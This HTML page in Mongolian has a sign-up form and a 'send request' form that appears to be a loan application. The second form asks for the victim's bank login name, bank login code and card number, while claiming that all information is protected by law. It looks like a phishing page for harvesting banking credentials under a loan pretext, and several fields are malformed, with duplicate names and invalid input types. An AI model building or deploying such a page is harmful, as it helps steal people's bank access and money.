<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Бүртгэл</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container" id="signUp" style="display: none;">
    <h1 class="form-title">Бүртгүүлэх</h1>
        <form method="post" action="register.php">
            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" name="fName" id="fName" placeholder="First Name" required>
                <label for="fName">Овог</label>
            </div>
            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" name="lName" id="lName" placeholder="last Name" required>
                <label for="lName">Нэр</label>
            </div>
            <div class="input-group">
                <i class="fas fa-mobile-phone"></i>
                <input type="text" name="number" id="number" placeholder="number" required>
                <label for="number">Дугаар</label>
            </div>
            <div class="input-group">
                <i class="fa fa-envelope"></i>
                <input type="email" name="email" id="email" placeholder="email" required>
                <label for="email">Email</label>
            </div>
            <div class="input-group">
                <i class="fas fa-lock"></i>
                <input type="password" name="password" id="password" placeholder="password" required>
                <label for="password">Нууц үг</label>
            </div>
            <input type="submit" class="btn" value="Бүртгүүлэх" name="signUp">
        </form>
        <p class="or">
        ----------------------------------------------------------------    
        </p>
       
        <div class="links">
            <p> Бүх мэдээллийг хуулиар хамгаална. </p>
            <button id="signInButton">Хүсэлт илгээх</button>
        </div>
    </div>

    <div class="container" id="signIn">
        <h1 class="form-title">Хүсэлт илгээх</h1>
            <form method="post" action="">
            <div class="input-group">
                    <i class="fa fa-code-fork"></i>
                    <input type="app" name="app" id="app" placeholder="app" required>
                    <label for="app">Апп сонгоно уу?</label>
                </div>
                <div class="input-group">
                    <i class="fa fa-dollar"></i>
                    <input type="app" name="app" id="app" placeholder="app" required>
                    <label for="app">Зээлийн хэмжээ</label>
                </div>
                <div class="input-group">
                    <i class="fa fa-bank"></i>
                    <input type="bank name" name="bank name" id="bank name" placeholder="bank name" required>
                    <label for="bank name">Банк нэвтрэх нэр</label>
                </div>
                <div class="input-group">
                    <i class="fa fa-bank"></i>
                    <input type="email" name="email" id="email" placeholder="email" required>
                    <label for="email">Банк нэвтрэх код</label>
                </div>
                <div class="input-group">
                    <i class="fa fa-credit-card"></i>
                    <input type="email" name="email" id="email" placeholder="email" required>
                    <label for="email">Картны дугаар</label>
                </div>
                
                <p class="recover">
                    <a href="#">Нууц үг мартсан</a>
                </p>
                <input type="submit" class="btn" value="Хүсэлт илгээх" name="signIn">
            </form>
            <p class="or">
            ----------------------------------------------------------------
                    </p>
           
            <div class="links">
                <p> Бүх мэдээллийг хуулиар хамгаална. </p>
                <button id="signUpButton">Бүртгүүлэх</button>
            </div>
        </div>
        <script src="script.js"></script>
</body>
</html>
